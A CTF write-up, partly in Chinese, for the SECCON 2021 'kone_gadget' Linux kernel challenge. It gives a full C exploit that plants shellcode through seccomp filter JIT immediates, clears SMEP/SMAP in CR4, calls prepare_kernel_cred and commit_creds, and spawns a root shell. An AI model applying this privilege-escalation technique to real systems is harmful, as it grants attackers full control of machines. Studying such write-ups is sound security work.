# SECCON2021-kone_gadget


# kone_gadget

Added to `arch/x86/entry/syscalls/syscall_64.tbl`

```
1337 64 seccon sys_seccon
```

Added to `kernel/sys.c`:

```c
SYSCALL_DEFINE1(seccon, unsigned long, rip)
{
  asm volatile("xor %%edx, %%edx;"
               "xor %%ebx, %%ebx;"
               "xor %%ecx, %%ecx;"
               "xor %%edi, %%edi;"
               "xor %%esi, %%esi;"
               "xor %%r8d, %%r8d;"
               "xor %%r9d, %%r9d;"
               "xor %%r10d, %%r10d;"
               "xor %%r11d, %%r11d;"
               "xor %%r12d, %%r12d;"
               "xor %%r13d, %%r13d;"
               "xor %%r14d, %%r14d;"
               "xor %%r15d, %%r15d;"
               "xor %%ebp, %%ebp;"
               "xor %%esp, %%esp;"
               "jmp %0;"
               "ud2;"
               : : "rax"(rip));
  return 0;
}
```

没有开启kaslr。提供了一次控制rip的机会，但是除了rax外所有的寄存器都被清空了。ebpf可以通过JIT产生内核可执行的shellcode，但是在本题中，unprivilege bpf被禁止了。而seccomp_filter的JIT是开启的，所以可以通过这个来实现shellcode。通过调试，`BPF_STMT(BPF_LD|BPF_K, value)`会被编译为`mov eax,value`的指令。我们可以控制value字段为想要执行的指令，然后通过跳转到下一个指令从而跳过无法识别的指令。这要求我们在通过系统调用进行跳转时偏移一定的字节。为了提高成功率，我们可以在前面喷射大量的nop。

## The full exp

```c
#include <linux/bpf_common.h>
#define _GNU_SOURCE
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/userfaultfd.h>
#include <malloc.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/xattr.h>
#include <unistd.h>

#define PAGE_SIZE 4096

void die(const char *msg) {
  perror(msg);
  exit(-1);
}

int global_fd;
uint64_t kernbase;
uint64_t user_cs, user_sp, user_ss, user_rflags;

uint64_t prepare_kernel_cred = 0xffffffff81073c60;
uint64_t commit_creds = 0xffffffff81073ad0;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81800e10 + 22;

void save_status() {
  __asm__("mov %0, cs;"
          "mov %1, ss;"
          "mov %2, rsp;"
          "pushfq;"
          "popq %3;"
          : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
          :
          : "memory");
  puts("[*] status has been saved.");
}

void pop_shell() {
  if (!getuid()) {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    puts("[*] Root! :)");
    execve("/bin/sh", argv, envp);
  } else {
    die("[!] spawn shell error!\n");
  }
}

// jmp rax 0xffffffff8106805a
int seccon(uint64_t rip) { return syscall(1337, rip); }

int main() {
  int i;
  uint64_t *fake_stack, *filter;
  uint64_t *sc;
  kernbase = 0xffffffff81000000;

  save_status();
  filter = malloc(0x313 * 8);

  fake_stack = mmap(
      (void *)0x100000000 - PAGE_SIZE, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
      MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED, -1, 0);
  if (fake_stack == MAP_FAILED) {
    die("[!] Failed to mmap fake_stack");
  }
  fake_stack = (uint64_t *)0x100000000;
  fake_stack[0] = prepare_kernel_cred;
  fake_stack[1] = commit_creds;
  fake_stack[2] = swapgs_restore_regs_and_return_to_usermode;
  fake_stack[3] = 0;                   // dummy rax
  fake_stack[4] = 0;                   // dummy rdi
  fake_stack[5] = (uint64_t)pop_shell; // user rip
  fake_stack[6] = user_cs;             // user cs
  fake_stack[7] = user_rflags;         // user rflags
  fake_stack[8] = user_sp;             // user sp
  fake_stack[9] = user_ss;             // user ss

  for (i = 0; i < 0x313; i++) {
    filter[i] = (uint64_t)(0x01eb9090) << 32;
  }
  printf("[+] pop_shell %p\n", &pop_shell);
  printf("[+] user_cs 0x%lx\n", user_cs);
  printf("[+] user_rflags 0x%lx\n", user_rflags);
  printf("[+] user_sp 0x%lx\n", user_sp);
  printf("[+] user_ss 0x%lx\n", user_ss);
  filter[0x312] = 0x7fff000000000006;
  sc = &filter[0x100];
  i = 0;
  // overwrite cr4, disable smap&smep
  sc[i++] = (uint64_t)(0x04E7200F) << 32; // mov rdi, cr4; add al, 0
  sc[i++] = (uint64_t)(0x01ebd231) << 32; // xor edx, edx
  sc[i++] = (uint64_t)(0x01ebc2ff) << 32; // inc edx
  sc[i++] = (uint64_t)(0x01ebe2d1) << 32; // shl edx, 1
  sc[i++] = (uint64_t)(0x01ebc2ff) << 32; // inc edx
  sc[i++] = (uint64_t)(0x0414E2C1) << 32; // shl edx, 20; add al, 0
  sc[i++] = (uint64_t)(0x01ebd2f7) << 32; // not edx
  sc[i++] = (uint64_t)(0x04D72148) << 32; // and rdi, rdx; add al, 0
  sc[i++] = (uint64_t)(0x04E7220F) << 32; // mov cr4, rdi; add al, 0
  // rsp = 0x100000000
  sc[i++] = (uint64_t)(0x01ebe431) << 32; // xor esp, esp
  sc[i++] = (uint64_t)(0x01ebccff) << 32; // dec esp
  sc[i++] = (uint64_t)(0x04c4ff48) << 32; // inc rsp; add al, 0
  // call prepare_kernel_cred
  sc[i++] = (uint64_t)(0x01ebff31) << 32; // xor edi, edi
  sc[i++] = (uint64_t)(0x01eb9058) << 32; // pop rax; nop
  sc[i++] = (uint64_t)(0x01ebd0ff) << 32; // call rax;
  // call commit_creds
  sc[i++] = (uint64_t)(0x04c78948) << 32; // mov rdi, rax; add al, 0
  sc[i++] = (uint64_t)(0x01eb9058) << 32; // pop rax; nop
  sc[i++] = (uint64_t)(0x01ebd0ff) << 32; // call rax;
  // call swapgs_restore_regs_and_return_to_usermode + 22
  sc[i++] = (uint64_t)(0x01eb9058) << 32; // pop rax; nop
  // ! `call rax` will destroy stack frame !!
  sc[i++] = (uint64_t)(0x01ebe0ff) << 32; // jmp rax;

  struct sock_fprog prog = {
      .len = 0x313,
      .filter = (struct sock_filter *)filter,
  };

  // fp = 0xffffc9000004d000 + 0x30
  prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
  prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);

  seccon(0xffffffffc0000400);
}
```

- `/proc/sys/net/core/bpf_jit_enable` 可以检查 bpf 能不能被 JIT
- `/proc/sys/kernel/unprivileged_bpf_disabled` 可以检查是否能执行
- [kernel doc](https://www.kernel.org/doc/html/latest/admin-guide/sysctl/kernel.html) 描述有许多在 `/proc/sys/` 下的设定

